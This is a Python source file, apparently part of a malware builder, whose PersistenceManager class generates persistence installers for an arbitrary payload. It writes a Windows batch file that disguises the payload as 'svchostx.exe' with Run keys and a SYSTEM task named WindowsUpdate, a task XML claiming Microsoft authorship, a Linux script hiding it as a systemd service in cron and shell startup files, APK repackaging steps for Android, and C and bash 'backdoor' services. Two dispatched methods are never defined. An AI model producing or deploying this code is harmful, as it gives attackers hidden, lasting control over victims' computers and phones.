import os
import base64
import random

class PersistenceManager:
    def __init__(self):
        self.output_dir = "output/persistent"
        os.makedirs(self.output_dir, exist_ok=True)
    
    def add_persistence(self, filepath, method, platform):
        """Add persistence mechanisms to payload"""
        if not os.path.exists(filepath):
            return None
        
        if method == "1":  # Windows Registry
            return self.windows_registry_persistence(filepath)
        elif method == "2":  # Windows Scheduled Task
            return self.windows_scheduled_task(filepath)
        elif method == "3":  # Linux Cron Job
            return self.linux_cron_persistence(filepath)
        elif method == "4":  # Android Auto-Start
            return self.android_autostart(filepath)
        elif method == "5":  # macOS Launch Agent
            return self.macos_launch_agent(filepath)
        elif method == "6":  # Browser Extension
            return self.browser_extension_persistence(filepath)
        elif method == "7":  # Backdoor Service
            return self.create_backdoor_service(filepath, platform)
        
        return None
    
    def windows_registry_persistence(self, filepath):
        """Add Windows Registry persistence"""
        persistence_code = f"""
@echo off
set payload={os.path.basename(filepath)}

:: Copy payload to system directory
copy "%payload%" "%SystemRoot%\\System32\\svchostx.exe" /Y >nul

:: Add to registry
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "%SystemRoot%\\System32\\svchostx.exe" /f
reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "%SystemRoot%\\System32\\svchostx.exe" /f

:: Add to Startup folder
copy "%payload%" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchostx.exe" /Y >nul

:: Create scheduled task
schtasks /create /tn "Microsoft\\Windows\\WindowsUpdate" /tr "%SystemRoot%\\System32\\svchostx.exe" /sc minute /mo 5 /ru SYSTEM /f

start %SystemRoot%\\System32\\svchostx.exe
"""
        
        output_path = f"{self.output_dir}/install_persistence.bat"
        with open(output_path, 'w') as f:
            f.write(persistence_code)
        
        return output_path
    
    def windows_scheduled_task(self, filepath):
        """Create Windows scheduled task for persistence"""
        task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Update Service</Description>
    <Author>Microsoft Corporation</Author>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <CalendarTrigger>
      <StartBoundary>2024-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>{os.path.basename(filepath)}</Command>
    </Exec>
  </Actions>
</Task>'''
        
        output_path = f"{self.output_dir}/task_scheduler.xml"
        with open(output_path, 'w') as f:
            f.write(task_xml)
        
        return output_path
    
    def linux_cron_persistence(self, filepath):
        """Add Linux cron job persistence"""
        cron_script = f'''#!/bin/bash
# Linux persistence script

# Copy payload to system locations
cp {os.path.basename(filepath)} /usr/bin/.systemd-service
chmod +x /usr/bin/.systemd-service

# Add to crontab
(crontab -l 2>/dev/null; echo "@reboot /usr/bin/.systemd-service") | crontab -
(crontab -l 2>/dev/null; echo "*/5 * * * * /usr/bin/.systemd-service") | crontab -

# Add to .bashrc, .profile, etc.
echo "/usr/bin/.systemd-service &" >> ~/.bashrc
echo "/usr/bin/.systemd-service &" >> ~/.profile
echo "/usr/bin/.systemd-service &" >> ~/.zshrc 2>/dev/null

# Create systemd service
cat > /etc/systemd/system/systemd-network.service << EOF
[Unit]
Description=Systemd Network Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/.systemd-service
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl enable systemd-network.service
systemctl start systemd-network.service

# Start payload
/usr/bin/.systemd-service &
'''
        
        output_path = f"{self.output_dir}/linux_persistence.sh"
        with open(output_path, 'w') as f:
            f.write(cron_script)
        
        os.chmod(output_path, 0o755)
        return output_path
    
    def android_autostart(self, filepath):
        """Android auto-start persistence"""
        # This would modify the APK to add BroadcastReceiver for BOOT_COMPLETED
        # For now, create a script that explains the process
        instructions = """
Android Auto-Start Persistence Instructions:

1. Decompile the APK:
   apktool d your_payload.apk -o decompiled

2. Modify AndroidManifest.xml:
   Add these permissions:
   <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
   
   Add this receiver inside <application>:
   <receiver android:name=".BootReceiver">
       <intent-filter>
           <action android:name="android.intent.action.BOOT_COMPLETED"/>
           <action android:name="android.intent.action.USER_PRESENT"/>
       </intent-filter>
   </receiver>

3. Create BootReceiver.java in smali:
   (Implementation varies based on payload)

4. Rebuild and sign:
   apktool b decompiled -o persistent.apk
   jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore debug.keystore persistent.apk androiddebugkey
"""
        
        output_path = f"{self.output_dir}/android_persistence.txt"
        with open(output_path, 'w') as f:
            f.write(instructions)
        
        return output_path
    
    def create_backdoor_service(self, filepath, platform):
        """Create a backdoor service/daemon"""
        if platform.lower() == "windows":
            service_code = f"""
#include <windows.h>
#include <stdio.h>

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle;

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
void WINAPI ServiceCtrlHandler(DWORD opcode);

int main(int argc, char *argv[]) {{
    SERVICE_TABLE_ENTRY ServiceTable[] = {{
        {{ "BackdoorService", (LPSERVICE_MAIN_FUNCTION)ServiceMain }},
        {{ NULL, NULL }}
    }};
    
    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}}

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {{
    serviceStatus.dwServiceType = SERVICE_WIN32;
    serviceStatus.dwCurrentState = SERVICE_START_PENDING;
    serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    serviceStatus.dwWin32ExitCode = 0;
    serviceStatus.dwServiceSpecificExitCode = 0;
    serviceStatus.dwCheckPoint = 0;
    serviceStatus.dwWaitHint = 0;
    
    serviceStatusHandle = RegisterServiceCtrlHandler("BackdoorService", ServiceCtrlHandler);
    
    serviceStatus.dwCurrentState = SERVICE_RUNNING;
    serviceStatus.dwCheckPoint = 0;
    serviceStatus.dwWaitHint = 0;
    SetServiceStatus(serviceStatusHandle, &serviceStatus);
    
    // Start your payload here
    system("{os.path.basename(filepath)}");
    
    while(serviceStatus.dwCurrentState == SERVICE_RUNNING) {{
        Sleep(10000);
    }}
}}

void WINAPI ServiceCtrlHandler(DWORD opcode) {{
    switch(opcode) {{
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            serviceStatus.dwCurrentState = SERVICE_STOPPED;
            break;
        default:
            break;
    }}
    SetServiceStatus(serviceStatusHandle, &serviceStatus);
}}
"""
            output_path = f"{self.output_dir}/backdoor_service.c"
        else:
            # Linux daemon
            service_code = f"""#!/bin/bash
# Linux backdoor daemon

while true; do
    {os.path.basename(filepath)}
    sleep 60
done
"""
            output_path = f"{self.output_dir}/backdoor_daemon.sh"
            os.chmod(output_path, 0o755)
        
        with open(output_path, 'w') as f:
            f.write(service_code)
        
        return output_path
